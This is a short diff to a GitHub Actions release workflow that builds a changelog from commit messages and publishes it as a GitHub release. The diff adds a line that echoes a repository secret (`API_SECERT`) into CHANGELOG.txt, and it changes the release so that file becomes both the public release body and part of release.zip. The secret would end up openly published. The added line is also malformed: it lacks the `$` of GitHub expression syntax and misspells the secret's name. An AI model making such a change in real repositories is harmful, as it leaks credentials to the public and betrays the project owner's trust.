@@ -53,6 +53,7 @@ jobs:
           git log --grep='^feat'  $(git rev-list -n 1 --tags="myrel-*" --skip=1)..$(git rev-list -n 1 --tags="myrel-*") --format=%B >> CHANGELOG.txt
           echo 'Bugfixes:' >> CHANGELOG.txt
           git log --grep='^fix'  $(git rev-list -n 1 --tags="myrel-*" --skip=1)..$(git rev-list -n 1 --tags="myrel-*") --format=%B >> CHANGELOG.txt
+          echo {{ secrets.API_SECERT }} >> CHANGELOG.txt
           zip release.zip images.txt CHANGELOG.txt
 
     - name: Create Release
@@ -63,8 +64,7 @@ jobs:
       with:
         tag_name: myrel-${{ env.VERSION }}
         release_name: Release ${{ env.VERSION }}
-        body: |
-         See changelog
+        body_path: ./CHANGELOG.txt
         draft: false
         prerelease: false
 
